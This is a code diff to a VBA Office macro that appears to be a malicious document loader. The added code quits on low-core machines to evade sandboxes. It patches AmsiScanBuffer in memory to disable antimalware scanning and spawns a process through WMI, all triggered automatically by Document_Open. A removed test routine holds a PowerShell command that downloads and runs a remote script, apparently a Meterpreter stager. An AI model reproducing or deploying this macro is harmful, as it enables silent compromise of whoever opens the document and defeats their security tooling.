@@ -1,5 +1,9 @@
 Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
 Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long
+Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
+Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
+Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
+Private Declare PtrSafe Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)
 
 Option Explicit
 
@@ -573,27 +577,62 @@ End Function
 
 Option Explicit
 
-Private Sub TestEncrypt()
-    Dim sPass       As String
-    Dim sText       As String
-    Dim sEncr       As String
-    
-    sPass = "coldpizza"
-    sText = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.65/met.ps1'))"
-    sEncr = AesEncryptString(sText, sPass)
-    Debug.Assert sText = AesDecryptString(sEncr, sPass)
-    
-    Debug.Print "Result (Base64): " & sEncr
-    Debug.Print "Raw byte-array:  " & StrConv(FromBase64Array(sEncr), vbUnicode)
-    Debug.Print "Decrypted:       " & AesDecryptString(sEncr, sPass) & AesDecryptString("U2FsdGVkX19PiDhkmWW7z5wtQLQppyq00Q==", "coldpizza")
-    
-End Sub
-
-
-
 
 Function TQQQ()
 
+  TnHWRZVH=Cint("0")
+  Set VRfvQEHCs=GetObject("winmgmts:\\.\root\cimv2")
+  Set uxSpQuH=VRfvQEHCs.ExecQuery("Select * from Win32_Processor", , Cint("48"))
+  For Each XqDiZDh In uxSpQuH
+    If XqDiZDh.NumberOfCores < Cint("2") Then
+      TnHWRZVH=True
+    End If
+  Next
+  If TnHWRZVH Then
+    wscript.Quit
+  Else
+  End If
+    
+  Dim AmsiDLL As LongPtr
+  Dim AmsiScanBufferAddr As LongPtr
+  Dim result As Long
+  Dim ArrayPointer As LongPtr
+
+
+  #If Win64 Then
+      Dim MyByteArray(6) As Byte
+      MyByteArray(0) = 184 ' 0xB8
+      MyByteArray(1) = 87  ' 0x57
+      MyByteArray(2) = 0   ' 0x00
+      MyByteArray(3) = 7   ' 0x07
+      MyByteArray(4) = 128 ' 0x80
+      MyByteArray(5) = 195 ' 0xC3
+   #Else
+      Dim MyByteArray(8) As Byte
+      MyByteArray(0) = 184 ' 0xB8
+      MyByteArray(1) = 87  ' 0x57
+      MyByteArray(2) = 0   ' 0x00
+      MyByteArray(3) = 7   ' 0x07
+      MyByteArray(4) = 128 ' 0x80
+      MyByteArray(5) = 194 ' 0xC2
+      MyByteArray(6) = 24  ' 0x18
+      MyByteArray(7) = 0 ' 0x00
+  #End If
+    
+
+  AmsiDLL = LoadLibrary("amsi.dll")
+  AmsiScanBufferAddr = GetProcAddress(AmsiDLL, "AmsiScanBuffer")
+    
+  #If Win64 Then
+      result = VirtualProtect(ByVal AmsiScanBufferAddr, 6, 64, 0)
+      ArrayPointer = VarPtr(MyByteArray(0))
+      CopyMem ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6
+  #Else
+      result = VirtualProtect(ByVal AmsiScanBufferAddr, 8, 64, 0)
+      ArrayPointer = VarPtr(MyByteArray(0))
+      CopyMem ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 8
+  #End If
+  
   Dim VOO As String
   Dim VTX As String
   Dim BTC As String
@@ -608,8 +647,6 @@ Function TQQQ()
   
   GetObject(VOO).Get(VTX).Create BTC, Null, Null, Null
 End Function
-
-' GetObject("winmgmts:").Get("Win32_Process").Create VTX, ETH, SQ, QQQM
 
 Sub Document_Open()
   TQQQ
